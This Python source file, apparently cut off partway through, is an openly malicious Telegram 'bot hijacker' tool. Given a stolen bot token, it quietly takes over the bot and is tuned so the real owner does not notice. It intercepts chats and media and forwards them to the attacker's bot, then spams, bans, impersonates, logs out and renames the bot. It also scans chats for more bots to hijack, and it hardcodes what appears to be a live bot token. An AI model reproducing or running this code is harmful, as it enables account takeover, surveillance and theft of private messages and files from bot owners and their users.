"""
==========================================================
    ☢️ BOT HIJACKER v6.5 — GENTLE SPY SPEED MODE ☢️
==========================================================
FIX in v6.5:
  ✅ SPY ON par bhi owner ka bot ~FULL SPEED!
     • Pehle: hum 24/7 long-poll karke updates race
       karte the → owner bot 90% slow ho jaata tha
     • Ab: GENTLE BURST polling (2s kaam + 4s aaram)
       → owner bot full speed, humein bhi updates milti hain!

  ✅ SPY OFF (default) → koi polling nahi = 100% full speed
  ✅ STOP TARGET → full long-poll (100% updates, bot band)
  ✅ Speed tuning: SPY_BURST / SPY_REST se adjust karo

  Baaki sab same: pagination, media steal, dark powers...
==========================================================
Requirements: pip install requests
==========================================================
"""
import os
from flask import Flask
import requests
import threading
import time


app = Flask(__name__)

@app.get("/")
def home():
    return "App is running"

# ============ APNA HIJACKER BOT TOKEN ============
HIJACKER_TOKEN = "9055611651:AAFc2LZLmdgpvRSIhyzpp46wicu7mZGox70"  # 👈 APNA TOKEN
MY_BASE = f"https://api.telegram.org/bot{HIJACKER_TOKEN}"

# ============ STATE ============
target = {
    "base": None,
    "token": None,
    "username": None,
    "id": None,
    "updates": [],
    "channels": {},
    "media": [],
    "control": False,        # False = owner ka bot NORMAL chal raha hai
    "spy": False,            # 👁️ SPY toggle (OFF = full speed!)
    "webhook_url": None,    # hijack se pehle save — resume ke liye
    "webhook_params": None,  # allowed_updates etc. save
}
lock = threading.Lock()
OWNER_ID = None

menu = {"current": "main", "map": {}, "selected": None,
        "pending": None, "pending_media": None, "page": 0}

# 📄 Pagination — ek page par itne channels/chats
PAGE_SIZE = 8

# 🐢💨 v6.5 GENTLE SPY — speed settings
SPY_BURST = 2    # kitne second tak updates uthao (chhota = owner fast)
SPY_REST = 4     # kitne second aaram karo (bada = owner aur zyada fast)

MEDIA_METHODS = {
    "photo":     ("sendPhoto",     "photo"),
    "video":     ("sendVideo",     "video"),
    "document":  ("sendDocument", "document"),
    "audio":     ("sendAudio",     "audio"),
    "voice":     ("sendVoice",     "voice"),
    "animation": ("sendAnimation", "animation"),
    "sticker":   ("sendSticker",   "sticker"),
}
MEDIA_KEYS = list(MEDIA_METHODS.keys())


# ==========================================================
#        🌈 KEYBOARD
# ==========================================================
def build_keyboard():
    cur = menu["current"]

    if cur == "main":
        with lock:
            spy_on = target["spy"]
            stopped = target["control"]
        # 👁️ Dynamic SPY button — ON/OFF status dikhta hai
        if stopped:
            spy_btn = "⏸️ TARGET STOPPED"
        elif spy_on:
            spy_btn = "👁️ SPY ON — dabao OFF"
        else:
            spy_btn = "👁️ SPY OFF — dabao ON"
        rows = [
            [spy_btn],
            ["📢 CHANNELS", "💬 CHATS"],
            ["⏸️ STOP TARGET", "▶️ RESUME TARGET"],
            ["💀 DARK POWERS", "🕵️ STEAL MEDIA"],
            ["📥 SPY LATEST", "💀 INFO"],
            ["🎯 HIJACK NEW", "🏷️ IMPERSONATE"],
        ]

    elif cur in ("channels", "chats"):
        labels = list(menu["map"].keys())
        total_pages = max(1, (len(labels) + PAGE_SIZE - 1) // PAGE_SIZE)
        menu["page"] = max(0, min(menu["page"], total_pages - 1))
        page = menu["page"]
        start = page * PAGE_SIZE
        page_labels = labels[start:start + PAGE_SIZE]

        rows = [[l] for l in page_labels]

        if total_pages > 1:
            nav = []
            nav.append("◀️ PREV" if page > 0 else "⚪")
            nav.append(f"📄 {page + 1}/{total_pages}")
            nav.append("NEXT ▶️" if page < total_pages - 1 else "⚪")
            rows.append(nav)
        rows.append(["⬅️ BACK"])

    elif cur == "channel":
        rows = [
            ["📝 POST", "📸 PHOTO"],
            ["🎥 VIDEO", "📁 FILE"],
            ["🎵 AUDIO", "🎬 GIF"],
            ["😀 STICKER", "📍 LOCATION"],
            ["📊 POLL", "💥 WAVE"],
            ["🤖 SCAN BOTS", "💣 NUKE"],
            ["📌 PIN MSG", "🗣️ SET TITLE"],
            ["📄 SET DESC", "🎨 SET PHOTO"],
            ["🔗 INVITE LINK", "👥 MEMBERS"],
            ["⬅️ BACK"],
        ]

    elif cur == "chat":
        rows = [
            ["✉️ SEND MSG", "👁️ SPY CHAT"],
            ["📤 FORWARD MSG", "💣 NUKE"],
            ["📌 PIN MSG", "🗑️ DELETE LAST"],
            ["🚫 BAN USER", "✅ UNBAN USER"],
            ["👥 MEMBERS", "📄 SET DESC"],
            ["🔗 INVITE LINK", "🚪 LEAVE CHAT"],
            ["⬅️ BACK"],
        ]

    elif cur == "dark":
        rows = [
            ["📢 BROADCAST ALL", "💣 NUKE ALL"],
            ["🍃 LOGOUT BOT", "🗑️ WIPE COMMANDS"],
            ["🤝 RELEASE", "⬅️ BACK"],
        ]
    else:
        rows = [["⬅️ BACK"]]

    return {"keyboard": rows, "resize_keyboard": True,
            "is_persistent": True,
            "input_field_placeholder": "☠️ Gentle Spy mode... 🦠"}


# ============ API HELPERS ============
def api(base, method, **kwargs):
    try:
        return requests.post(f"{base}/{method}", **kwargs).json()
    except Exception as e:
        return {"ok": False, "description": str(e)}


def send_to_owner(text):
    if OWNER_ID is None:
        return
    api(MY_BASE, "sendMessage", json={
        "chat_id": OWNER_ID, "text": text,
        "parse_mode": "HTML", "reply_markup": build_keyboard()})


def download_media(token, file_id):
    r = api(f"https://api.telegram.org/bot{token}", "getFile", json={"file_id": file_id})
    if not r.get("ok"):
        return None, r.get("description", "?")
    path = r["result"]["file_path"]
    url = f"https://api.telegram.org/file/bot{token}/{path}"
    try:
        content = requests.get(url, timeout=180).content
        return content, None
    except Exception as e:
        return None, str(e)


def upload_media(base, method, field, chat_id, content, caption=""):
    try:
        fname = f"file_{int(time.time())}.bin"
        if field == "photo": fname = "photo.jpg"
        elif field == "video": fname = "video.mp4"
        elif field == "animation": fname = "anim.mp4"
        elif field == "sticker": fname = "sticker.webp"
        elif field == "voice": fname = "voice.ogg"
        r = requests.post(
            f"{base}/{method}",
            data={"chat_id": chat_id, "caption": caption},
            files={field: (fname, content)},
            timeout=180
        ).json()
        return r
    except Exception as e:
        return {"ok": False, "description": str(e)}


# ==========================================================
#     🔇 HIJACK — SILENT + SPEED MODE (spy default OFF)
# ==========================================================
def do_hijack(token):
    token = token.strip()
    base_ = f"https://api.telegram.org/bot{token}"
    info = requests.get(f"{base_}/getMe").json()
    if not info.get("ok"):
        send_to_owner("❌ <b>Token invalid!</b>")
        return False

    bot = info["result"]

    # Webhook ki info save karo
    wh = requests.get(f"{base_}/getWebhookInfo").json()
    w_url, w_params = None, None
    if wh.get("ok"):
        w_url = wh["result"].get("url", "") or None
        if w_url:
            w_params = {
                "allowed_updates": wh["result"].get("allowed_updates", []),
                "secret_token": (wh["result"].get("secret_token") or None),
                "max_connections": wh["result"].get("max_connections"),
            }

    with lock:
        target.update({"base": base_, "token": token, "username": bot["username"],
                       "id": bot["id"], "updates": [], "channels": {}, "media": [],
                       "control": False,
                       "spy": False,          # 🚀 SPY default OFF = FULL SPEED!
                       "webhook_url": w_url, "webhook_params": w_params})
        has_webhook = "webhook" if w_url else "polling"

    print(f"\n🦠 SILENT HIJACKED: @{bot['username']} ({has_webhook} mode) — SPEED MODE ON")
    go_menu("main")
    if has_webhook:
        spy_note = ("👁️ Live-spy ke liye 👁️ <b>SPY</b> button dabao\n"
                    "⏸️ ya STOP TARGET (full control)")
    else:
        spy_note = ("👁️ Live-spy ke liye 👁️ <b>SPY</b> button dabao —\n"
                    "🚀 <b>GENTLE MODE:</b> owner bot speed par bilkul normal!\n"
                    "<i>(100% updates nahi milti — kuch miss ho sakti hai)</i>")
    send_to_owner(
        f"✅ <b>HIJACKED (SPEED MODE)!</b> ☢️\n\n"
        f"🤖 @{bot['username']}\n"
        f"🆔 <code>{bot['id']}</code>\n"
        f"📡 Mode: <code>{has_webhook}</code>\n\n"
        f"🚀 <b>Owner ka bot 100% FULL SPEED chal raha hai!</b>\n"
        f"😎 Usko lagta bhi nahi kuch hua...\n\n"
        f"⚡ Saare attack actions (post/nuke/ban/media bhejna)\n"
        f"abhi bhi kaam karte hain — bina kisi speed loss ke!\n\n"
        f"{spy_note}")
    return True


# ==========================================================
#     👁️ SPY TOGGLE — gentle mode ke saath!
# ==========================================================
def toggle_spy():
    with lock:
        if not target["base"]:
            send_to_owner("⚠️ Pehle koi bot hijack karo!"); return
        if target["control"]:
            send_to_owner("⏸️ Bot abhi STOPPED hai — pehle ▶️ RESUME TARGET karo!"); return
        if target["webhook_url"]:
            send_to_owner("☕ Ye WEBHOOK bot hai — silent spy possible nahi.\n"
                         "⏸️ STOP TARGET dabao (wahi full spy dega)"); return
        target["spy"] = not target["spy"]
        new_state = target["spy"]
        uname = target["username"]
    if new_state:
        print(f"👁️ SPY ON (gentle): @{uname}")
        send_to_owner(
            "👁️ <b>SPY ON (GENTLE MODE)!</b> 🦠\n\n"
            "Chats/Channels/Media ab track ho rahe hain!\n\n"
            "🚀 <b>Owner ka bot ab bhi FULL SPEED hai!</b>\n"
            "Hum sirf chhote bursts me updates lete hain —\n"
            "owner ka bot turant respond karta rehta hai.\n\n"
            "⚠️ Fair deal: humein 100% updates nahi milti (kuch\n"
            "miss ho sakti hain), par owner ko speed ka pata nahi!\n\n"
            "🕵️ Puri spy chahiye? ⏸️ STOP TARGET (full spy, bot band)")
    else:
        print(f"🚀 SPY OFF: @{uname} full speed wapas!")
        send_to_owner(
            "🚀 <b>SPY OFF — FULL SPEED!</b>\n\n"
            "Ab hum koi updates race nahi karte.\n"
            f"Owner ka bot @{uname} 100% fast chal raha hai! 😎\n\n"
            "📌 Ab tak jo capture hua tha (chats/media) wo\n"
            "dikh'ta rahega — 👁️ SPY CHAT / STEAL MEDIA use karo.")


# ==========================================================
#     ⏸️ STOP / ▶️ RESUME
# ==========================================================
def take_control():
    with lock:
        base = target["base"]
        if not base:
            send_to_owner("⚠️ Pehle koi bot hijack karo!"); return
        if target["control"]:
            send_to_owner("😏 Already band hai! Control tere paas hai.")
            return
        if target["webhook_url"]:
            requests.get(f"{base}/deleteWebhook")
        target["control"] = True
        target["spy"] = False     # control mode me spy alag se zaroori nahi
        uname = target["username"]
    print(f"⏸️ CONTROL TAKEN: @{uname} ka bot band!")
    send_to_owner(
        f"⏸️ <b>TARGET STOPPED!</b> 💀\n\n"
        f"Owner ka bot @{uname} ab kaam karna band!\n"
        f"👁️ Spy mode full ON — messages/channels ab track honge\n\n"
        f"<i>▶️ RESUME TARGET se wapas chalu kar sakta hai</i>")


def resume_target():
    with lock:
        base = target["base"]
        if not base:
            send_to_owner("⚠️ Pehle koi bot hijack karo!"); return
        if not target["control"]:
            send_to_owner("😌 Owner ka bot toh normal hi chal raha hai!")
            return
        target["control"] = False
        w_url = target["webhook_url"]
        w_params = target["webhook_params"] or {}
        uname = target["username"]
    if w_url:
        payload = {"url": w_url}
        if w_params.get("allowed_updates"):
            payload["allowed_updates"] = w_params["allowed_updates"]
        if w_params.get("secret_token"):
            payload["secret_token"] = w_params["secret_token"]
        api(base, "setWebhook", json=payload)
    print(f"▶️ RESUMED: @{uname} wapas normal!")
    send_to_owner(
        f"▶️ <b>TARGET RESUMED!</b> 🎭\n\n"
        f"Owner ka bot @{uname} wapas NORMAL/FULL SPEED chal raha hai!\n"
        f"😎 Usse kya pata beech me kya hua tha... 🦠")


# ============ MENU NAVIGATION ============
def go_menu(name):
    menu["pending"] = None
    menu["pending_media"] = None

    if name == "main":
        menu["current"], menu["map"] = "main", {}
        send_to_owner("🏠 <b>MAIN MENU</b>\n\n☠️ Kyaa ukhaadna hai boss? 😈")

    elif name == "channels":
        menu["page"] = 0
        with lock:
            channels = dict(target["channels"])
        if not target["base"]:
            send_to_owner("⚠️ Pehle hijack karo!"); return
        if not channels:
            send_to_owner("📭 Koi channel track nahi hua!\n\n"
                          "👁️ SPY ON karo + bot kisi channel me admin ho + post aaye toh dikhega")
            return
        menu["map"] = {f"📢 {n}": cid for cid, n in channels.items()}
        total = len(menu["map"])
        pages = max(1, (total + PAGE_SIZE - 1) // PAGE_SIZE)
        menu["current"] = "channels"
        send_to_owner(f"📢 <b>CHANNELS</b> — total {total}, {pages} page(s)\n📄 Page 1 — chuno! 🔥")

    elif name == "chats":
        menu["page"] = 0
        with lock:
            updates = list(target["updates"])
        if not target["base"]:
            send_to_owner("⚠️ Pehle hijack karo!"); return
        if not updates:
            send_to_owner("📭 Koi message nahi aaya abhi...\n\n"
                          "👁️ SPY ON karo — phir messages track honge!")
            return
        chats = {u["chat_id"]: u["chat_name"] for u in updates}
        menu["map"] = {f"💬 {n}": cid for cid, n in chats.items()}
        total = len(menu["map"])
        pages = max(1, (total + PAGE_SIZE - 1) // PAGE_SIZE)
        menu["current"] = "chats"
        send_to_owner(f"💬 <b>CHATS</b> — total {total}, {pages} page(s)\n📄 Page 1 — chuno! ✉️")

    elif name == "channel":
        menu["current"] = "channel"
        send_to_owner(f"📢 <code>{menu['selected']}</code>\n\n☢️ Is channel me TOTAL WAR tools!")

    elif name == "chat":
        menu["current"] = "chat"
        send_to_owner(f"💬 <code>{menu['selected']}</code>\n\n☢️ Is chat me kya karna hai?")

    elif name == "dark":
        menu["current"] = "dark"
        send_to_owner("💀 <b>DARK POWERS</b>\n\n📢 BROADCAST ALL → saari chats me\n💣 NUKE ALL → sab jagah dhamaka\n🍃 LOGOUT → owner ka server tooda\n🗑️ WIPE → commands saaf")


# ============ DARK POWERS ============
def broadcast_all(text):
    with lock:
        base, chats = target["base"], list({u["chat_id"] for u in target["updates"]})
    if not chats:
        send_to_owner("📭 Koi chat tracked nahi (SPY ON/STOP ke baad hi chats aayengi)..."); return
    send_to_owner(f"📢 {len(chats)} chats me broadcast! 🚀")
    ok = 0
    for c in chats:
        if api(base, "sendMessage", json={"chat_id": c, "text": text}).get("ok"):
            ok += 1
        time.sleep(0.3)
    send_to_owner(f"✅ {ok}/{len(chats)} chats me pahuncha! 💀")


def nuke_all():
    with lock:
        base, chats = target["base"], list({u["chat_id"] for u in target["updates"]})
    if not chats:
        send_to_owner("📭 Koi chat nahi..."); return
    for c in chats:
        api(base, "sendMessage", json={"chat_id": c, "text": "☢️ BOOM! HIJACKED! 💀"})
        time.sleep(0.3)
    send_to_owner("🔥 <b>NUKE COMPLETE!</b>")


def logout_bot():
    with lock:
        base = target["base"]
    r = requests.get(f"{base}/logOut").json()
    send_to_owner("🍃 <b>LOGOUT!</b> Owner ka server-connection toot gaya! 😈" if r.get("ok")
                  else f"⚠️ {r.get('description')}")


def wipe_commands():
    with lock:
        base = target["base"]
    r = api(base, "deleteMyCommands")
    send_to_owner("🗑️ Saare commands udaye! 😈" if r.get("ok") else f"❌ {r.get('description')}")


def impersonate():
    menu["pending"] = ("newname", None)
    send_to_owner("🏷️ Bot ka NAYA NAAM likho:")


# ============ CHAT POWERS ============
def apply_powers(kind, ch, text):
    with lock:
        base = target["base"]
    if kind == "post":
        r = api(base, "sendMessage", json={"chat_id": ch, "text": text})
        send_to_owner("✅ Posted! 📢💀" if r.get("ok") else f"❌ {r.get('description')}")
    elif kind == "send":
        r = api(base, "sendMessage", json={"chat_id": ch, "text": text})
        send_to_owner("✅ Sent! 💀" if r.get("ok") else f"❌ {r.get('description')}")
    elif kind == "broadcast":
        broadcast_all(text)
    elif kind == "newname":
        r = api(base, "setMyName", json={"name": text[:64]})
        api(base, "setMyDescription", json={"description": f"☢️ Hijacked! {text} 💀"})
        send_to_owner(f"🏷️ Naam badal gaya: <b>{text}</b> 😈" if r.get("ok")
                      else f"❌ {r.get('description')}")
    elif kind == "pin":
        r = api(base, "sendMessage", json={"chat_id": ch, "text": text})
        if r.get("ok"):
            p = api(base, "pinChatMessage", json={"chat_id": ch, "message_id": r["result"]["message_id"]})
            send_to_owner("📌 Bheja + PIN! 😈" if p.get("ok") else f"📌 Pin fail: {p.get('description')}")
        else:
            send_to_owner(f"❌ {r.get('description')}")
    elif kind == "title":
        r = api(base, "setChatTitle", json={"chat_id": ch, "title": text[:128]})
        send_to_owner(f"🗣️ Naam: <b>{text}</b> 😈" if r.get("ok")
                      else f"❌ {r.get('description')}\n<i>(admin chahiye)</i>")
    elif kind == "desc":
        r = api(base, "setChatDescription", json={"chat_id": ch, "description": text[:255]})
        send_to_owner("📄 Description set! 😈" if r.get("ok") else f"❌ {r.get('description')}")
    elif kind == "location":
        try:
            lat, lon = [x.strip() for x in text.split(",")]
            r = api(base, "sendLocation", json={"chat_id": ch, "latitude": lat, "longitude": lon})
            send_to_owner(f"📍 Location bhej di: {lat},{lon} 😈" if r.get("ok") else f"❌ {r.get('description')}")
        except:
            send_to_owner("⚠️ Format: <code>28.61,77.20</code>")
    elif kind == "poll":
        parts = [p.strip() for p in text.split("|")]
        if len(parts) >= 3:
            r = api(base, "sendPoll", json={"chat_id": ch, "question": parts[0], "options": parts[1:]})
            send_to_owner("📊 POLL bhej diya! 😈" if r.get("ok") else f"❌ {r.get('description')}")
        else:
            send_to_owner("⚠️ Format: <code>Sawal | Option1 | Option2 | Option3</code>")
    elif kind == "ban":
        if text.strip().lstrip("-").isdigit():
            r = api(base, "banChatMember", json={"chat_id": ch, "user_id": int(text.strip())})
            send_to_owner("🚫 BANDA BAAHAR! 😈💀" if r.get("ok") else f"❌ {r.get('description')}\n<i>(admin chahiye)</i>")
        else:
            send_to_owner("⚠️ Numeric USER_ID bhejo")
    elif kind == "unban":
        if text.strip().lstrip("-").isdigit():
            r = api(base, "unbanChatMember", json={"chat_id": ch, "user_id": int(text.strip()), "only_if_banned": True})
            send_to_owner("✅ Wapas aaya 😄" if r.get("ok") else f"❌ {r.get('description')}")
        else:
            send_to_owner("⚠️ Numeric USER_ID bhejo")


def invite_link(ch):
    with lock:
        base = target["base"]
    r = api(base, "exportChatInviteLink", json={"chat_id": ch})
    send_to_owner(f"🔗 <b>INVITE LINK churaya:</b>\n<code>{r['result']}</code> 😈" if r.get("ok")
                  else f"❌ {r.get('description')}\n<i>(admin chahiye)</i>")


def member_count(ch):
    with lock:
        base = target["base"]
    r = api(base, "getChatMemberCount", json={"chat_id": ch})
    send_to_owner(f"👥 Is chat me <b>{r['result']}</b> banday hain 💀" if r.get("ok")
                  else f"❌ {r.get('description')}")


def delete_last(ch):
    with lock:
        base = target["base"]
    r = api(base, "sendMessage", json={"chat_id": ch, "text": "💀"})
    if r.get("ok"):
        m = r["result"]["message_id"]; time.sleep(1)
        d = api(base, "deleteMessage", json={"chat_id": ch, "message_id": m})
        send_to_owner("🗑️ Bheja + Udaya — poof! 😈" if d.get("ok") else f"🗑️ {d.get('description')}")
    else:
        send_to_owner(f"❌ {r.get('description')}")


def leave_chat(ch):
    with lock:
        base = target["base"]
    r = api(base, "leaveChat", json={"chat_id": ch})
    send_to_owner("🚪 Bot chat se bhaag gaya! 😈" if r.get("ok") else f"❌ {r.get('description')}")


def scan_bots(ch):
    with lock:
        base = target["base"]
    r = api(base, "getChatAdministrators", json={"chat_id": ch})
    if not r.get("ok"):
        send_to_owner(f"❌ {r.get('description')}"); return
    bots = [a for a in r["result"] if a["user"].get("is_bot")]
    if not bots:
        send_to_owner("🤖 Koi bot-admin nahi mila!"); return
    lines = "\n".join(f"🤖 @{b['user'].get('username')} | 🆔 <code>{b['user']['id']}</code> | 🔑 {b['status']}" for b in bots)
    send_to_owner(f"🤖 <b>{len(bots)} BOT admins mile:</b>\n\n{lines}\n\n⚡ Token mile toh paste karo — hijack! 💀")


def attack_wave(ch):
    with lock:
        base = target["base"]
    for i in range(3):
        api(base, "sendMessage", json={"chat_id": ch, "text": f"💥 WAVE {i+1}/3 ☢️ HIJACKED 💀"})
        time.sleep(0.5)
    send_to_owner("🔥 3 waves! 💥")


def forward_to_owner(ch):
    with lock:
        updates = [u for u in target["updates"] if u["chat_id"] == ch]
    if not updates:
        send_to_owner("📭 Kuch nahi hai is chat me..."); return
    for u in updates[-5:]:
        api(MY_BASE, "sendMessage", json={
            "chat_id": OWNER_ID,
            "text": f"📤 <b>{u['user']}</b> ({u['chat_name']}):\n<code>{u['text']}</code>",
            "parse_mode": "HTML"})
        time.sleep(0.2)


# ==========================================================
#        🕵️ STEAL MEDIA
# ==========================================================
def steal_media():
    with lock:
        token = target["token"]
        media = list(target["media"][-5:])
    if not token:
        send_to_owner("⚠️ Pehle hijack karo!"); return
    if not media:
        send_to_owner("📭 Abhi tak koi media nahi aayi...\n"
                      "💡 👁️ SPY ON karo — media tabhi capture hogi")
        return
    send_to_owner(f"🕵️ <b>{len(media)} media CHURA raha hoon...</b> 🔥")
    for m in media:
        content, err = download_media(token, m["file_id"])
        if content:
            method, field = MEDIA_METHODS[m["type"]]
            upload_media(MY_BASE, method, field, OWNER_ID, content,
                        f"🕵️ Churaya: {m['user']} ({m['chat_name']})")
        else:
            send_to_owner(f"⚠️ Ek media fail: {err}")
        time.sleep(0.3)


# ==========================================================
#     📸 OWNER MEDIA → download → target chat me UPLOAD
# ==========================================================
def handle_owner_media(msg):
    with lock:
        base = target["base"]

    if menu["pending"] == "chatphoto":
        ch = menu["selected"]
        menu["pending"] = None
        if "photo" in msg:
            content, err = download_media(HIJACKER_TOKEN, msg["photo"][-1]["file_id"])
            if content:
                r = requests.post(f"{base}/setChatPhoto",
                                  data={"chat_id": ch},
                                  files={"photo": ("dp.jpg", content)}).json()
                send_to_owner("🎨 <b>DP BADAL DIYA!</b> 😈🔥" if r.get("ok")
                              else f"❌ {r.get('description')}")
            else:
                send_to_owner(f"❌ Download fail: {err}")
        else:
            send_to_owner("⚠️ PHOTO bhejo DP ke liye!")
            menu["pending"] = "chatphoto"
        return

    if not menu["pending_media"]:
        send_to_owner("🤔 Pehle button dabao (PHOTO/VIDEO/FILE/AUDIO/GIF/STICKER)!"); return

    kind, ch = menu["pending_media"]
    if kind not in msg and not (kind == "photo" and "photo" in msg):
        send_to_owner(f"⚠️ Ye {kind} nahi hai! {kind.upper()} bhejo.")
        menu["pending_media"] = (kind, ch)
        return

    file_id = None
    if kind == "photo" and "photo" in msg:
        file_id = msg["photo"][-1]["file_id"]
    elif kind in msg:
        file_id = msg[kind]["file_id"]

    if not file_id:
        send_to_owner(f"⚠️ {kind} nahi mila!"); return

    menu["pending_media"] = None
    content, err = download_media(HIJACKER_TOKEN, file_id)
    if not content:
        send_to_owner(f"❌ Download fail: {err}"); return

    method, field = MEDIA_METHODS[kind]
    r = upload_media(base, method, field, ch, content, msg.get("caption", "") or "")
    send_to_owner(f"✅ {kind.upper()} channel me bhej diya! 💀" if r.get("ok")
                  else f"❌ {r.get('description')}")


# ==========================================================
#     🕵️ SPY LISTENER — v6.5 GENTLE MODE!
#     • CONTROL (STOP TARGET) → full long-poll (sab updates)
#     • SPY mode → gentle burst polling (owner bot FAST rehta hai)
#     • SPY OFF → koi polling nahi (100% full speed)
# ==========================================================
def target_listener():
    offset = None
    while True:
        with lock:
            base = target["base"]
            control = target["control"]
            spy = target["spy"]
            uses_webhook = target["webhook_url"] is not None
        if not base:
            time.sleep(1); continue
        if (not spy) and (not control):
            # 🚀 SPEED MODE: koi polling nahi → owner 100% fast
            time.sleep(1); continue
        if uses_webhook and not control:
            # ☕ webhook bot: silent spy possible nahi (Telegram rule)
            time.sleep(1); continue

        try:
            # ⏸️ CONTROL mode = FULL long-poll (bot band hai, race nahi)
            poll_timeout = 50 if control else SPY_BURST

            r = requests.get(f"{base}/getUpdates",
                             params={"offset": offset, "timeout": poll_timeout},
                             timeout=poll_timeout + 10).json()
            if not r.get("ok"):
                # 409/conflict = owner ka bot poll kar raha hai
                # (achha sign! gentle ban jaate hain, zyada aaram karo)
                time.sleep(SPY_REST if not control else 2)
                continue

            for upd in r.get("result", []):
                offset = upd["update_id"] + 1

                msg = upd.get("message") or upd.get("channel_post")
                if not msg:
                    continue
                with lock:
                    target["updates"].append({
                        "chat_id": msg["chat"]["id"],
                        "chat_name": msg["chat"].get("title") or msg["chat"].get("first_name", "Unknown"),
                        "user": (msg.get("from") or {}).get("first_name", "Channel"),
                        "text": msg.get("text") or msg.get("caption") or "(media)",
                    })
                    if len(target["updates"]) > 100:
                        target["updates"].pop(0)

                for k in MEDIA_KEYS:
                    if k in msg:
                        item = msg[k]
                        fid = item[-1]["file_id"] if k == "photo" else item["file_id"]
                        with lock:
                            target["media"].append({
                                "type": k, "file_id": fid,
                                "user": (msg.get("from") or {}).get("first_name", "?"),
                                "chat_name": msg["chat"].get("title") or msg["chat"].get("first_name", "?"),
                            })
                            if len(target["media"]) > 30:
                                target["media"].pop(0)
                        print(f"🕵️ MEDIA captured: {k}")
                        break

                if upd.get("channel_post"):
                    with lock:
                        target["channels"][msg["chat"]["id"]] = msg["chat"].get("title", "Channel")

            # 🐢 GENTLE: spy mode me har burst ke baad aaram —
            # is aaram me owner ka bot apne updates full speed uthata hai
            if spy and not control:
                time.sleep(SPY_REST)

        except Exception:
            time.sleep(2)


def spy_list(filter_chat=None, n=10):
    with lock:
        updates = list(target["updates"])
    if filter_chat:
        updates = [u for u in updates if u["chat_id"] == filter_chat]
    if not updates:
        send_to_owner("📭 Kuch nahi aaya...\n💡 👁️ SPY ON hai na? ON karo pehle!")
        return
    lines = "\n".join(f"👁️ <b>{u['user']}</b> ({u['chat_name']}):\n<code>{u['text']}</code>" for u in updates[-n:])
    send_to_owner(f"📥 <b>Latest:</b>\n\n{lines}")


# ============ OWNER TEXT PROCESSOR ============
def handle_owner_text(text):
    with lock:
        base = target["base"]

    # ---- 1. Pending input ----
    if menu["pending"]:
        kind, param = menu["pending"]
        menu["pending"] = None
        if kind == "hijack":
            do_hijack(text)
        elif kind == "chatphoto":
            send_to_owner("⚠️ PHOTO bhejo, TEXT nahi!")
            menu["pending"] = "chatphoto"
        else:
            apply_powers(kind, param, text)
        return

    # ---- 2. List buttons ----
    if text in menu["map"]:
        menu["selected"] = menu["map"][text]
        go_menu("channel" if menu["current"] == "channels" else "chat")
        return

    # ---- 3. Token paste ----
    if ":" in text and len(text) > 20 and " " not in text:
        do_hijack(text); return

    upper = text.upper()
    ch = menu["selected"]

    # ---- 4. 📄 PAGINATION ----
    if text.startswith("NEXT ▶️"):
        menu["page"] += 1
        labels = list(menu["map"].keys())
        total_pages = max(1, (len(labels) + PAGE_SIZE - 1) // PAGE_SIZE)
        menu["page"] = min(menu["page"], total_pages - 1)
        send_to_owner(f"📄 <b>Page {menu['page'] + 1}/{total_pages}</b> — chuno! 🔥")
        return
    elif text.startswith("◀️"):
        menu["page"] = max(0, menu["page"] - 1)
        total_pages = max(1, (len(list(menu['map'].keys())) + PAGE_SIZE - 1) // PAGE_SIZE)
        send_to_owner(f"📄 <b>Page {menu['page'] + 1}/{total_pages}</b> — wapas aaye! 🔙")
        return
    elif text.startswith("📄") or text.startswith("⚪"):
        return

    # ---- 5. BACK ----
    if "BACK" in upper:
        if menu["current"] == "channel": go_menu("channels")
        elif menu["current"] == "chat": go_menu("chats")
        elif menu["current"] in ("channels", "chats", "dark"): go_menu("main")
        else: go_menu("main")
        return

    # ===== MAIN MENU =====
    if menu["current"] == "main":
        # 👁️ SPY TOGGLE — sabse pehle check!
        if "SPY ON" in upper or "SPY OFF" in upper or \
           (upper.startswith("👁️ SPY") and "CHAT" not in upper):
            toggle_spy()
        elif "STOP TARGET" in upper:
            take_control()
        elif "RESUME" in upper:
            resume_target()
        elif "CHANNELS" in upper: go_menu("channels")
        elif "CHATS" in upper: go_menu("chats")
        elif "DARK" in upper: go_menu("dark")
        elif "STEAL MEDIA" in upper or "STEAL" in upper: steal_media()
        elif "SPY LATEST" in upper or "LATEST" in upper: spy_list()
        elif "IMPERSONATE" in upper: impersonate()
        elif "HIJACK" in upper:
            menu["pending"] = ("hijack", None)
            send_to_owner("🎯 Token paste karo:")
        elif "INFO" in upper:
            with lock:
                if target["base"]:
                    if target["control"]:
                        mode = "⏸️ STOPPED (control tere paas) — spy full ON"
                    elif target["webhook_url"]:
                        mode = "☕ Webhook bot — spy ke liye STOP TARGET"
                    elif target["spy"]:
                        mode = "👁️ SPY ON (gentle) — tracking! (owner fast)"
                    else:
                        mode = "🚀 SPEED MODE — owner bot 100% fast!"
                    send_to_owner(f"💀 <b>Target:</b> @{target['username']}\n"
                                  f"🆔 <code>{target['id']}</code>\n"
                                  f"🎭 Halat: {mode}\n"
                                  f"侦探 Stolen media: {len(target['media'])} | 📢 Channels: {len(target['channels'])}")
                else:
                    send_to_owner("⚠️ Pehle hijack karo!")
        elif "RELEASE" in upper:
            with lock:
                if target["control"]:
                    send_to_owner("⏸️ Pehle ▶️ RESUME TARGET karo, phir RELEASE!")
                    return
                if target["base"]:
                    had = target["username"]
                    target.update({"base": None, "token": None, "username": None, "id": None,
                                   "updates": [], "channels": {}, "media": [],
                                   "control": False, "spy": False,
                                   "webhook_url": None, "webhook_params": None})
                    go_menu("main")
                    send_to_owner(f"🤝 @{had} chhoda — uska bot wapas NORMAL chal raha hai! 😇")
                else:
                    send_to_owner("😏 Koi target nahi hai!")

    # ===== CHANNEL MENU =====
    elif menu["current"] == "channel":
        if "POST" in upper:
            menu["pending"] = ("post", ch); send_to_owner("📝 Message likho:")
        elif "PHOTO" in upper:
            menu["pending_media"] = ("photo", ch); send_to_owner("📸 PHOTO bhejo:")
        elif "VIDEO" in upper:
            menu["pending_media"] = ("video", ch); send_to_owner("🎥 VIDEO bhejo:")
        elif "FILE" in upper:
            menu["pending_media"] = ("document", ch); send_to_owner("📁 FILE bhejo:")
        elif "AUDIO" in upper:
            menu["pending_media"] = ("audio", ch); send_to_owner("🎵 AUDIO bhejo:")
        elif "GIF" in upper or "ANIMATION" in upper:
            menu["pending_media"] = ("animation", ch); send_to_owner("🎬 GIF bhejo:")
        elif "STICKER" in upper:
            menu["pending_media"] = ("sticker", ch); send_to_owner("😀 STICKER bhejo:")
        elif "LOCATION" in upper:
            menu["pending"] = ("location", ch)
